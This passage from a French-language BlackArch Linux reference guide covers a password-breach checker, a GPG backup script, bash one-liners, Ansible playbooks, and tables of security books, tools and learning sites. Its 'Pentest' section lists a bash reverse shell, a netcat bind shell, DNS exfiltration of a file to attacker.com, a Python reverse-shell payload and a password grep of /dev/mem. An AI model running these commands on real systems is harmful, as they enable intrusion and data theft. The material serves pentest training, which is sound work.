    sha1 = hashlib.sha1(password.encode("utf-8")).hexdigest().upper()
    prefix = sha1[:5]
    suffix = sha1[5:]

    url = f"https://api.pwnedpasswords.com/range/{prefix}"
    response = requests.get(url, timeout=30)
    response.raise_for_status()

    for line in response.text.splitlines():
        candidate, count = line.split(":")
        if candidate == suffix:
            return True, int(count)
    return False, 0


def main() -> None:
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <mot_de_passe>")
        sys.exit(1)

    password = sys.argv[1]
    found, count = check_password(password)
    if found:
        print(f"[!] Mot de passe compromis : {count} occurrences dans les fuites")
    else:
        print("[+] Mot de passe non trouvé dans les fuites connues")


if __name__ == "__main__":
    main()
```

### 12.15 Script 15 : Sauvegarde chiffrée automatique

```python
#!/usr/bin/env python3
"""
encrypted_backup.py
Auteur : hackerstchad
Version : 2026-2027
Description : Crée une archive tar.gz chiffrée avec GPG.
"""

import argparse
import subprocess
import sys
from datetime import datetime
from pathlib import Path


def run_backup(source: Path, destination: Path, recipient: str) -> None:
    """
    Crée une archive compressée puis la chiffre avec GPG.
    """
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    archive = destination / f"backup_{timestamp}.tar.gz"
    encrypted = destination / f"backup_{timestamp}.tar.gz.gpg"

    print(f"[*] Création de {archive}")
    subprocess.run(
        ["tar", "-czf", str(archive), "-C", str(source.parent), str(source.name)],
        check=True,
    )

    print(f"[*] Chiffrement vers {encrypted}")
    subprocess.run(
        ["gpg", "--encrypt", "--recipient", recipient, "--output", str(encrypted), str(archive)],
        check=True,
    )

    archive.unlink()
    print(f"[+] Sauvegarde terminée : {encrypted}")


def main() -> None:
    parser = argparse.ArgumentParser(description="Sauvegarde chiffrée")
    parser.add_argument("source", help="Répertoire ou fichier à sauvegarder")
    parser.add_argument("destination", help="Répertoire de destination")
    parser.add_argument("--recipient", "-r", required=True, help="Destinataire GPG")
    args = parser.parse_args()

    run_backup(Path(args.source), Path(args.destination), args.recipient)


if __name__ == "__main__":
    main()
```

---

## 13. One-liners Bash & Zsh

### 13.1 Système

```bash
# Top 10 des processus consommant le plus de CPU
ps aux --sort=-%cpu | head -n 11

# Top 10 des processus consommant le plus de mémoire
ps aux --sort=-%mem | head -n 11

# Tuer tous les processus d'un utilisateur
sudo pkill -u nom_utilisateur

# Afficher les ports en écoute avec les programmes
ss -tulnp

# Trouver les fichiers modifiés dans les dernières 24 heures
find / -mtime -1 -type f 2>/dev/null

# Trouver les fichiers appartenant à un utilisateur
find / -user nom_utilisateur 2>/dev/null

# Lister les fichiers les plus volumineux
du -ah / | sort -rh | head -n 20

# Vider les logs sans supprimer les fichiers
sudo find /var/log -type f -exec sh -c '> {}' \;

# Historique des commandes avec horodatage
HISTTIMEFORMAT="%d/%m/%y %T " history

# Afficher les dépendances d'un binaire
ldd /usr/bin/ssh

# Créer un fichier de la taille demandée
dd if=/dev/zero of=fichier.bin bs=1M count=100

# Créer un fichier aléatoire
dd if=/dev/urandom of=fichier.bin bs=1M count=10
```

### 13.2 Réseau et sécurité

```bash
# Scanner rapide des hôtes actifs sur un réseau
nmap -sn 192.168.1.0/24

# Scanner les 1000 premiers ports
nmap -F 192.168.1.1

# Extraire toutes les adresses IP d'un fichier
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' fichier.log

# Suivre les redirections d'une URL
curl -s -L -I -o /dev/null -w '%{url_effective}\n' https://bit.ly/xxx

# Télécharger tous les fichiers d'un répertoire web
wget -r -np -nH --cut-dirs=1 -R index.html http://site.com/repertoire/

# Capturer les en-têtes HTTP
curl -s -D - http://site.com -o /dev/null

# Test de bande passante avec iperf3
iperf3 -c serveur

# Résoudre en masse des noms de domaines
cat domains.txt | xargs -I {} nslookup {}

# Trouver les certificats expirant bientôt
for host in $(cat hosts.txt); do echo | openssl s_client -servername $host -connect $host:443 2>/dev/null | openssl x509 -noout -dates -subject; done
```

### 13.3 Pentest

```bash
# Reverse shell simple en bash
bash -i >& /dev/tcp/192.168.1.10/4444 0>&1

# Bind shell avec netcat
nc -lvp 4444 -e /bin/bash

# Exfiltrer un fichier via DNS
cat secret.txt | xxd -p | xargs -I {} dig @attacker.com {}.attacker.com

# Générer un payload reverse shell Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Chercher des mots de passe dans la mémoire
grep -a -E "password|passwd|motdepasse" /dev/mem 2>/dev/null

# Extraire les mots de passe d'un fichier KeePass (nécessite outil)
keepass2john fichier.kdbx > keepass.hash

# Trouver les fichiers SUID
find / -perm -4000 -type f 2>/dev/null

# Trouver les fichiers SGID
find / -perm -2000 -type f 2>/dev/null

# Lister les capacités Linux
getcap -r / 2>/dev/null
```

### 13.4 Fichiers et texte

```bash
# Supprimer les lignes vides d'un fichier
sed '/^$/d' fichier > fichier_propre

# Remplacer les espaces multiples par une virgule
sed 's/  */,/g' fichier

# Inverser l'ordre des lignes
tac fichier

# Compter les occurrences d'un mot
grep -o "mot" fichier | wc -l

# Extraire les emails d'un fichier
grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' fichier

# Extraire les URLs
grep -oE 'https?://[^" ]+' fichier

# Générer une wordlist depuis une page web
lynx -dump http://site.com | tr ' ' '\n' | sort -u > wordlist.txt

# Convertir un fichier en base64
base64 fichier > fichier.b64

# Décoder du base64
base64 -d fichier.b64
```

---

## 14. Automatisation avec Ansible

### 14.1 Installation d'Ansible

```bash
sudo pacman -S ansible
```

### 14.2 Playbook de mise à jour BlackArch

```yaml
---
- name: Mise à jour BlackArch
  hosts: blackarch_hosts
  become: yes

  tasks:
    - name: Synchroniser les mirroirs
      command: reflector --country France --protocol https --latest 10 --sort rate --save /etc/pacman.d/mirrorlist

    - name: Mettre à jour le système
      pacman:
        update_cache: yes
        upgrade: yes

    - name: Installer les outils essentiels
      pacman:
        name:
          - nmap
          - sqlmap
          - metasploit
          - wireshark-qt
          - aircrack-ng
          - john
          - hashcat
        state: present
```

### 14.3 Playbook de durcissement SSH

```yaml
---
- name: Durcir SSH
  hosts: all
  become: yes

  tasks:
    - name: Désactiver connexion root
      lineinfile:
        path: /etc/ssh/sshd_config
        regexp: '^PermitRootLogin'
        line: 'PermitRootLogin no'

    - name: Authentification par clé uniquement
      lineinfile:
        path: /etc/ssh/sshd_config
        regexp: '^PasswordAuthentication'
        line: 'PasswordAuthentication no'

    - name: Redémarrer sshd
      service:
        name: sshd
        state: restarted
```

---

## 15. Ressources, livres et liens

### 15.1 Documentation officielle

| Ressource | Lien |
|-----------|------|
| Site officiel BlackArch | https://www.blackarch.org/ |
| Guide d'installation BlackArch | https://www.blackarch.org/downloads.html |
| Wiki Arch Linux (fr) | https://wiki.archlinux.org/title/Main_page |
| Wiki Arch Linux (en) | https://wiki.archlinux.org/ |
| Man pages en ligne | https://man.archlinux.org/ |
| Forums Arch Linux | https://bbs.archlinux.org/ |
| BlackArch GitHub | https://github.com/BlackArch/blackarch |
| AUR | https://aur.archlinux.org/ |
| Pacman manual | https://man.archlinux.org/man/pacman.8 |

### 15.2 Livres recommandés

| Titre | Auteur(s) | Thème |
|-------|-----------|-------|
| "The Web Application Hacker's Handbook" | Dafydd Stuttard, Marcus Pinto | Tests d'intrusion web |
| "The Hacker Playbook 3" | Peter Kim | Méthodologie Red Team |
| "Metasploit: The Penetration Tester's Guide" | David Kennedy et al. | Metasploit |
| "Hacking: The Art of Exploitation" | Jon Erickson | Exploitation binaire |
| "Practical Malware Analysis" | Michael Sikorski, Andrew Honig | Analyse de malwares |
| "Real-World Bug Hunting" | Peter Yaworski | Bug bounty |
| "The Shellcoder's Handbook" | Chris Anley et al. | Shellcode et exploitation |
| "Black Hat Python" | Justin Seitz, Tim Arnold | Python pour le pentest |
| "Violent Python" | TJ O'Connor | Scripts d'offensive en Python |
| "Applied Cryptography" | Bruce Schneier | Cryptographie |
| "Linux Basics for Hackers" | OccupyTheWeb | Linux orienté sécurité |
| "Kali Linux Revealed" | Raphael Hertzog et al. | Administration Kali/BlackArch |
| "Bug Bounty Bootcamp" | Vickie Li | Bug bounty pour débutants |
| "Attacking Network Protocols" | James Forshaw | Protocoles réseau |
| "Gray Hat Hacking" | Allen Harper et al. | Hacking éthique avancé |

### 15.3 Plateformes d'apprentissage

| Plateforme | Lien | Description |
|------------|------|-------------|
| Hack The Box | https://www.hackthebox.com/ | Labs et CTF |
| TryHackMe | https://tryhackme.com/ | Apprentissage guidé |
| PortSwigger Web Security Academy | https://portswigger.net/web-security | Apprentissage web |
| PentesterLab | https://pentesterlab.com/ | Exercices pratiques |
| VulnHub | https://www.vulnhub.com/ | VMs vulnérables |
| PicoCTF | https://picoctf.org/ | CTF pour tous niveaux |
| OverTheWire | https://overthewire.org/wargames/ | Wargames Linux |
| Root-Me | https://www.root-me.org/ | Challenges variés |
| CyberSecLabs | https://cyberseclabs.co.uk/ | Labs réalistes |
| Proving Grounds | https://portal.offensive-security.com/proving-grounds | Labs OffSec |

### 15.4 Outils et frameworks complémentaires

| Outil/Framework | Lien |
|-----------------|------|
| Nmap | https://nmap.org/ |
| Metasploit | https://www.metasploit.com/ |
| Burp Suite | https://portswigger.net/burp |
| OWASP ZAP | https://www.zaproxy.org/ |
| Wireshark | https://www.wireshark.org/ |
| Hashcat | https://hashcat.net/hashcat/ |
| John the Ripper | https://www.openwall.com/john/ |
| Ghidra | https://ghidra-sre.org/ |
| Radare2 | https://rada.re/ |
| BloodHound | https://github.com/BloodHoundAD/BloodHound |
| Cobalt Strike | https://www.cobaltstrike.com/ |
| Sliver | https://github.com/BishopFox/sliver |
| Mythic | https://github.com/its-a-feature/Mythic |
| Sliver C2 | https://sliver.sh/ |
| Caldera | https://caldera.mitre.org/ |

### 15.5 Ressources OSINT

| Outil | Lien |
|-------|------|
| theHarvester | https://github.com/laramies/theHarvester |
| Maltego | https://www.maltego.com/ |
| SpiderFoot | https://www.spiderfoot.net/ |
| Shodan | https://www.shodan.io/ |
| Censys | https://search.censys.io/ |
| Hunter.io | https://hunter.io/ |
| IntelX | https://intelx.io/ |
| Have I Been Pwned | https://haveibeenpwned.com/ |
| DeHashed | https://www.dehashed.com/ |
| URLScan | https://urlscan.io/ |

### 15.6 Chaînes YouTube et blogs

| Nom | Lien | Type |
|-----|------|------|
| IppSec | https://www.youtube.com/c/ippsec | Walkthroughs HTB |
| John Hammond | https://www.youtube.com/c/JohnHammond010 | CTF et malware |
| LiveOverflow | https://www.youtube.com/c/LiveOverflowCTF | Binary exploitation |
| HackerSploit | https://www.youtube.com/c/HackerSploit | Tutoriels sécurité |
| STÖK | https://www.youtube.com/c/STOKfredrik | Bug bounty |
| NahamSec | https://www.youtube.com/c/NahamSec | Reconnaissance et bug bounty |
| Null Byte | https://www.youtube.com/c/NullByteWHT | Tutoriels pratiques |
| Black Hills Information Security | https://www.blackhillsinfosec.com/ | Blog et webcasts |
| Pentestmonkey | https://pentestmonkey.net/ | Cheatsheets |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings | Payloads |
| HackTricks | https://book.hacktricks.xyz/ | Wiki pentest |
| GTFOBins | https://gtfobins.github.io/ | Escalade de privilèges |
| LOLBAS | https://lolbas-project.github.io/ | Binaires Windows |

---

## 16. Annexes

### 16.1 Table des codes de sortie courants

| Code | Signification |
|------|---------------|
| `0` | Succès |
| `1` | Erreur générale |
| `2` | Utilisation incorrecte d'une commande intégrée |
| `126` | Commande trouvée mais non exécutable |
| `127` | Commande introuvable |
| `128` | Argument invalide passé à exit |
| `130` | Interrompu par Ctrl+C (SIGINT) |
| `137` | Tué par SIGKILL (souvent OOM killer) |
| `139` | Segmentation fault (SIGSEGV) |
| `143` | Tué par SIGTERM |

### 16.2 Signaux Unix courants

| Signal | Numéro | Description |
|--------|--------|-------------|
| `SIGHUP` | 1 | Déconnexion du terminal |
| `SIGINT` | 2 | Interruption (Ctrl+C) |
| `SIGQUIT` | 3 | Quitter (Ctrl+\) |
| `SIGKILL` | 9 | Terminaison forcée |
| `SIGTERM` | 15 | Terminaison gracieuse |
| `SIGSTOP` | 19 | Arrêter l'exécution |
| `SIGCONT` | 18 | Reprendre l'exécution |

### 16.3 Permissions en notation octale

| Valeur | Permissions | Description |
|--------|-------------|-------------|
| `0` | `---` | Aucun droit |
| `1` | `--x` | Exécution |
| `2` | `-w-` | Écriture |
| `3` | `-wx` | Écriture + exécution |
| `4` | `r--` | Lecture |
| `5` | `r-x` | Lecture + exécution |
| `6` | `rw-` | Lecture + écriture |
| `7` | `rwx` | Tous les droits |

### 16.4 Caractères spéciaux du shell

| Caractère | Signification |
|-----------|---------------|
| `|` | Tube (pipe) |
| `>` | Redirection sortie |
| `>>` | Redirection sortie en append |
| `<` | Redirection entrée |
| `2>` | Redirection erreurs |
| `&>` | Redirection sortie + erreurs |
| `;` | Séquence de commandes |
| `&&` | ET logique |
| `\|\|` | OU logique |
| `&` | Exécution en arrière-plan |
| `*` | Joker zéro ou plusieurs caractères |
| `?` | Joker un caractère |
| `[]` | Classe de caractères |
| `{}` | Expansion d'accolades |
| `$()` | Substitution de commande |
| `` ` ` `` | Substitution de commande (ancienne) |
| `~` | Répertoire home |
| `.` | Répertoire courant |
| `..` | Répertoire parent |
| `#` | Commentaire |

### 16.5 Résumé des raccourcis clavier Bash/Zsh

| Raccourci | Action |
|-----------|--------|
| `Ctrl + A` | Début de ligne |
| `Ctrl + E` | Fin de ligne |
| `Ctrl + U` | Supprimer du curseur au début |
| `Ctrl + K` | Supprimer du curseur à la fin |
| `Ctrl + W` | Supprimer le mot précédent |
| `Ctrl + Y` | Coller le texte supprimé |
| `Ctrl + R` | Recherche dans l'historique |
| `Ctrl + G` | Annuler la recherche |
| `Ctrl + L` | Effacer l'écran |
| `Ctrl + C` | Interrompre le processus |
| `Ctrl + Z` | Suspendre le processus |
| `Ctrl + D` | Envoyer EOF |
| `Alt + F` | Mot suivant |
| `Alt + B` | Mot précédent |
| `Alt + D` | Supprimer le mot suivant |

### 16.6 Sources de wordlists

| Ressource | Lien |
|-----------|------|
| SecLists | https://github.com/danielmiessler/SecLists |
| rockyou.txt | /usr/share/wordlists/rockyou.txt (sur BlackArch/Kali) |
| fuzzdb | https://github.com/fuzzdb-project/fuzzdb |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| Assetnote Wordlists | https://wordlists-cdn.assetnote.io/ |
| Weakpass | https://weakpass.com/ |
| CrackStation | https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm |

---

<div align="center">
    
##  Crédits

**Auteur :** `hackerstchad`  
**Version :** `2026 - 2027`  
**Distribution cible :** `BlackArch Linux` / `Arch Linux`  
**Langage :** `Python 3.13+`  

</div>
